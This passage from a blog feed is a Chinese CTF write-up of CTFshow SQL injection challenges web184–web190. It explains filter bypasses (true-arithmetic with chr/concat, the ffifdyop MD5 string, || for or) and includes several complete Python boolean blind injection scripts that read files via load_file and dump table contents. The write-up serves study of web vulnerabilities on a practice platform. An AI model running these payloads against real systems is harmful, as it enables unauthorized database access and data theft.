class="line"></span><br></pre></td></tr></table></figure><p>注意，判断条件的43是使用payload所知道的。<br> 此外，还可以使用如下payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tableName=ctfshow_user group by <span class="keyword">pass</span> having <span class="keyword">pass</span>  like <span class="number">0x63746673686f7725</span></span><br></pre></td></tr></table></figure><h2 id="group-by和having关键字"><a href="#group-by和having关键字" class="headerlink" title="group by和having关键字"></a>group by和having关键字</h2><p>HAVING 是 SQL 中用于对分组后的结果进行筛选的关键字。它通常与 GROUP BY 关键字一起使用，用于对分组后的结果进行聚合计算和筛选。<br>比如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT student, AVG(score) AS avg_score</span><br><span class="line">FROM scores</span><br><span class="line">GROUP BY student</span><br><span class="line">HAVING avg_score &gt;= <span class="number">90</span>;</span><br></pre></td></tr></table></figure><p><code>HAVING pass LIKE 0x63746673686f7725 </code>对分组后的结果进行筛选，只返回 pass 列中包含字符串 <code>0x63746673686f7725</code> 的分组。<br>这里就不写脚本了，注意所对应的条件是返回中存在<code>$user_count = 1</code></p><h1 id="web185、web186"><a href="#web185、web186" class="headerlink" title="web185、web186"></a>web185、web186</h1><h3 id="使用true关键字等来绕过数字过滤-chr函数"><a href="#使用true关键字等来绕过数字过滤-chr函数" class="headerlink" title="使用true关键字等来绕过数字过滤 chr函数"></a>使用true关键字等来绕过数字过滤 chr函数</h3><p>数字被过滤了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#x27;|\&quot;|union|\`|sleep|benchmark/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>true关键字再mysql中等价为1，也就是可以true+true=2，因此可以由此构造出任何数字。<br>因此我们可以字符串-&gt;转为十进制数字-&gt;chr和concat函数拼接合成为payload中的需要字符串。<br>脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@File    :   SQL盲注3.py</span></span><br><span class="line"><span class="string">@Contact :   2997453446@qq.com</span></span><br><span class="line"><span class="string">@Blog    :   natro92.github.io</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@Modify Time      @Author    @Version    @Desciption</span></span><br><span class="line"><span class="string">------------      -------    --------    -----------</span></span><br><span class="line"><span class="string">2023/7/10 20:16   natro92      1.0         None</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将数字转换为true相加</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">num2True</span>(<span class="params">num</span>):</span><br><span class="line">    a = <span class="string">&#x27;true&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> num != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num - <span class="number">1</span>):</span><br><span class="line">            a += <span class="string">&#x27;+true&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将文本转换为concat和chr函数结合的格式</span></span><br><span class="line">    <span class="comment"># 比如：aa -&gt; chr(一大堆true相加),chr(又一大堆true相加)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_style</span>(<span class="params">s</span>):</span><br><span class="line">    str1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    str1 += <span class="string">&#x27;chr(&#x27;</span> + num2True(<span class="built_in">ord</span>(s[<span class="number">0</span>])) + <span class="string">&#x27;)&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s[<span class="number">1</span>:]:</span><br><span class="line">        str1 += <span class="string">&#x27;,chr(&#x27;</span> + num2True(<span class="built_in">ord</span>(i)) + <span class="string">&#x27;)&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> str1</span><br><span class="line"></span><br><span class="line">url = <span class="string">r&#x27;http://76c1b9c5-22be-4d38-8e83-4cdf71d2b93a.challenge.ctf.show/select-waf.php&#x27;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">r&#x27;0123456789abcdefghijklmnopqrstuvwxyz-&#125;&#x27;</span></span><br><span class="line">flag_pre = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line">payload = <span class="string">&quot;ctfshow_user as a right join ctfshow_user as b on b.pass like(concat(&#123;&#125;))&quot;</span></span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">key = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span> key == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;tableName&#x27;</span>: payload.<span class="built_in">format</span>(change_style(flag_pre + j + <span class="string">&#x27;%&#x27;</span>))</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;$user_count = 43&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag_pre += j</span><br><span class="line">            <span class="built_in">print</span>(flag_pre)</span><br><span class="line">            <span class="keyword">if</span> j == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                key = <span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>不止有true可以生成任意数字，以下几个函数也可以：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ceil() floor() true version() pi()</span><br></pre></td></tr></table></figure><h1 id="web187"><a href="#web187" class="headerlink" title="web187"></a>web187</h1><h3 id="绕过sqlMD5加密的万能串ffifdyop"><a href="#绕过sqlMD5加密的万能串ffifdyop" class="headerlink" title="绕过sqlMD5加密的万能串ffifdyop"></a>绕过sqlMD5加密的万能串ffifdyop</h3><p>用MD5加密密码，<code>ffifdyop</code>正好可以得到<code>&#39;or&#39;6�]��!r,��b</code><br>也就达到了绕过的目的。<br>注意flag在返回包中。</p><h1 id="web188"><a href="#web188" class="headerlink" title="web188"></a>web188</h1><h3 id="弱比较-sql中-等价于or"><a href="#弱比较-sql中-等价于or" class="headerlink" title="弱比较 sql中||等价于or"></a>弱比较 sql中||等价于or</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//密码判断</span><br><span class="line"> <span class="keyword">if</span>($row[<span class="string">&#x27;pass&#x27;</span>]==intval($password))&#123;</span><br><span class="line">     $ret[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;登陆成功&#x27;</span>;</span><br><span class="line">     array_push($ret[<span class="string">&#x27;data&#x27;</span>], array(<span class="string">&#x27;flag&#x27;</span>=&gt;$flag));</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>flag为字符串，字符串的intval永远为0.因此传入0即可。<br><code>username=1||1&amp;password=0</code></p><h1 id="web189"><a href="#web189" class="headerlink" title="*web189"></a>*web189</h1><h3 id="布尔盲注-if-load-file-locate"><a href="#布尔盲注-if-load-file-locate" class="headerlink" title="布尔盲注 if load_file locate"></a>布尔盲注 if load_file locate</h3><p>提示里有说：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag在api/index.php文件中</span><br></pre></td></tr></table></figure><p>那么这里就需要盲注来解决。<br>mysql导入外部文件查询。</p><ul><li>load_file(path)导入文件</li><li>locate(substr,str)获取匹配到的字符串位置</li></ul><p>这道题的payload就是：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(locate(<span class="string">&quot;ctfshow&#123;&quot;</span>,<span class="string">&#x27; + &#x27;</span>load_file(<span class="string">&quot;/var/www/html/api/index.php&quot;</span>))&gt;这里是位置,<span class="number">0</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>让我们看看gpt怎么说<br>如果 ‘ctfshow{‘ 在 “/var/www/html/api/index.php” 文件的内容中存在，并且位置大于 1（即找到了），那么条件表达式 locate(“ctfshow{“,’ + ‘load_file(“/var/www/html/api/index.php”))&gt;1 将返回真，进入条件为真的分支，即返回 0。<br>接下来就是写脚本。<br>这个脚本最开始每太想出来怎么写，看了下大佬们的wp，才明白。这里会将wp中的脚本也列举出来。<br>脚本的思路就是，先搜索到flag的位置，然后一步一步给他读出来。<br>盲注需要找到回显的地方。<br>可以注意到，密码为0时，当账号为0，返回的是密码错误<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689075241167-f497b6be-cc54-40e6-8a25-06d580071436.png" alt="image.png"><br>当账号为1时，返回的是查询失败<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689075274763-4a0331a8-9216-4583-ae04-4d2e80f13121.png" alt="image.png"><br>勾<del>吧，payload测试一半不能用了，以为是写错了，重启靶场就好了。</del><br>用下面这个来看是什么字符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(substr(load_file(<span class="string">&#x27;/var/www/html/api/index.php&#x27;</span>),&#123;&#125;,<span class="number">1</span>)=(<span class="string">&#x27;&#123;&#125;&#x27;</span>),<span class="number">0</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>勾吧题， wp很好理解，脚本写了三个小时整。<br>6点48开始写 9点48才写完。太抽象了<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689083298083-26b2335c-3036-4323-a955-54b23f46827f.png" alt="image.png"><br>python基础太差了，就这还是照着wp的解法写的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@File    :   SQL布尔盲注.py</span></span><br><span class="line"><span class="string">@Contact :   2997453446@qq.com</span></span><br><span class="line"><span class="string">@Blog    :   natro92.github.io</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@Modify Time      @Author    @Version    @Desciption</span></span><br><span class="line"><span class="string">------------      -------    --------    -----------</span></span><br><span class="line"><span class="string">2023/7/11 18:48   natro92      1.0         None</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">r&#x27;http://2daeac7e-8170-4826-9997-2b4a8a6ec9ca.challenge.ctf.show/api/&#x27;</span></span><br><span class="line">flag_pre = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line">str1 = <span class="string">&quot;abcdefghijklmnopqr-stuvwxyz0123456789&#123;&lt;&gt;$=,;_ &#125;&quot;</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 先找flag在哪：</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_flag</span>():</span><br><span class="line">    left = <span class="number">0</span></span><br><span class="line">    right = <span class="number">1000</span>  <span class="comment"># 这里根据实际情况进行修改</span></span><br><span class="line">    <span class="keyword">while</span> left &lt; right:</span><br><span class="line">        mid = (left + right) // <span class="number">2</span>  <span class="comment"># //floor整除</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;if(locate(&quot;&#x27;</span> + flag_pre + <span class="string">&#x27;&quot;,load_file(&quot;/var/www/html/api/index.php&quot;))&gt;&#123;&#125;,0,1)&#x27;</span>.<span class="built_in">format</span>(mid),</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;密码错误&#x27;</span> <span class="keyword">in</span> r.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right = mid</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(mid)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag</span>(<span class="params">pos1, flag_pre1, stra</span>):</span><br><span class="line">    pos1 += <span class="built_in">len</span>(flag_pre1)+<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> stra:</span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&#x27;username&#x27;</span>: <span class="string">&quot;if(substr(load_file(&#x27;/var/www/html/api/index.php&#x27;),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),0,1)&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(pos1), j),</span><br><span class="line">                <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;0&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">            r = requests.post(url, data=data)</span><br><span class="line">            <span class="comment"># print(data)</span></span><br><span class="line">            <span class="comment"># print(r.json()[&#x27;msg&#x27;])</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;密码错误&#x27;</span> <span class="keyword">in</span> r.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">                flag_pre1 += j</span><br><span class="line">                pos1 += <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> j == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                exit()</span><br><span class="line">        <span class="built_in">print</span>(flag_pre1)</span><br><span class="line">    <span class="keyword">return</span> flag_pre1</span><br><span class="line"></span><br><span class="line">pos = find_flag()</span><br><span class="line"><span class="built_in">print</span>(get_flag(pos, flag_pre, str1))</span><br></pre></td></tr></table></figure><h2 id="注意-1"><a href="#注意-1" class="headerlink" title="注意"></a>注意</h2><p>这里面payload是不能使用单引号的，单引号会导致前面闭合以至于不能够查询。要使用双引号。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689075867993-0f9922b1-6204-4e3a-842a-5063ace97744.png" alt="image.png"></p><h1 id="web190"><a href="#web190" class="headerlink" title="web190"></a>web190</h1><p>在查询语句里面加了单引号<code>username = &#39;&#123;$username&#125;&#39;</code><br>不用读文件了，直接就读数据就可以。<br>payload：<br><code>username=admin&#39;||1||&#39;</code><br>那就可以把上面那个payload去掉第一段方法。<br>找到布尔盲注构造位置：<br><code>username=admin&#39;and+0#&amp;password=0</code>：<br>返回用户名不存在<br><code>username=admin&#39;and+1#&amp;password=0</code>：<br>返回密码错误<br>由此编写脚本：（20min）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@File    :   SQL布尔盲注2.py   </span></span><br><span class="line"><span class="string">@Contact :   2997453446@qq.com</span></span><br><span class="line"><span class="string">@Blog    :   natro92.github.io</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">@Modify Time      @Author    @Version    @Desciption</span></span><br><span class="line"><span class="string">------------      -------    --------    -----------</span></span><br><span class="line"><span class="string">2023/7/11 22:02   natro92      1.0         None</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">r&#x27;http://96880f33-872c-4e26-9e91-a87d096bb6e2.challenge.ctf.show/api/&#x27;</span></span><br><span class="line">flag_pre = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line">str1 = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789&#123;&lt;&gt;$=,;_ -&#125;&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;admin&#x27;and+if(substr(database(),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),1,0)#&quot;</span></span><br><span class="line">payload = <span class="string">&quot;admin&#x27;and+if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),1,0)#&quot;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str1:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: payload.<span class="built_in">format</span>(i, j),</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="comment"># print(data)</span></span><br><span class="line">        <span class="comment"># print(r.json()[&#x27;msg&#x27;])</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;密码错误&#x27;</span> <span class="keyword">in</span> r.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">            res += j</span><br><span class="line">            <span class="built_in">print</span>(res)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> j == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">            exit()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>分别修改payload参数可以得到需要的名称：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;admin&#x27;and+if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),1,0)#&quot;</span></span><br></pre></td></tr></table></figure><p><code>ctfshow_fl0g,ctfshow_user</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;admin&#x27;and+if(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),1,0)#&quot;</span></span><br></pre></td></tr></table></figure><p><code>id,f1ag</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@File    :   SQL布尔盲注2.py   </span></span><br><span class="line"><span class="string">@Contact :   2997453446@qq.com</span></span><br><span class="line"><span class="string">@Blog    :   natro92.github.io</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">@Modify Time      @Author    @Version    @Desciption</span></span><br><span class="line"><span class="string">------------      -------    --------    -----------</span></span><br><span class="line"><span class="string">2023/7/11 22:02   natro92      1.0         None</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">r&#x27;http://96880f33-872c-4e26-9e91-a87d096bb6e2.challenge.ctf.show/api/&#x27;</span></span><br><span class="line">flag_pre = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line">str1 = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789&#123;&lt;&gt;$=,;_ -&#125;&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;admin&#x27;and+if(substr(database(),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),1,0)#&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;admin&#x27;and+if(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),1,0)#&quot;</span></span><br><span class="line">payload = <span class="string">&quot;admin&#x27;and+if(substr((select group_concat(f1ag) from ctfshow_fl0g),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),1,0)#&quot;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str1:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: payload.<span class="built_in">format</span>(i, j),</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="comment"># print(data)</span></span><br><span class="line">        <span class="comment"># print(r.json()[&#x27;msg&#x27;])</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;密码错误&#x27;</span> <span class="keyword">in</span> r.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">            res += j</span><br><span class="line">            <span class="built_in">print</span>(res)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">if</span> j == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">            exit()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>如果脚本编写异常，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line"><span class="built_in">print</span>(r.json()[<span class="string">&#x27;msg&#x27;</span>])</span><br></pre></td></tr></table></figure><p>这俩玩应是非常有用的。<br>如果由于因为太快导致的json报错，可以手动加一行休眠</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time </span><br><span class="line">time.sleep(<span class="number">0.3</span>)</span><br></pre></td></tr></table></figure><p>即可</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> CTFshow0-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用Python脚本修改语雀导文件图片格式</title>
      <link href="/2023/07/09/%E4%BD%BF%E7%94%A8Python%E8%84%9A%E6%9C%AC%E4%BF%AE%E6%94%B9%E8%AF%AD%E9%9B%80%E5%AF%BC%E5%87%BAmd%E6%96%87%E4%BB%B6%E5%9B%BE%E7%89%87%E6%A0%BC%E5%BC%8F/"/>
      <url>/2023/07/09/%E4%BD%BF%E7%94%A8Python%E8%84%9A%E6%9C%AC%E4%BF%AE%E6%94%B9%E8%AF%AD%E9%9B%80%E5%AF%BC%E5%87%BAmd%E6%96%87%E4%BB%B6%E5%9B%BE%E7%89%87%E6%A0%BC%E5%BC%8F/</url>
      
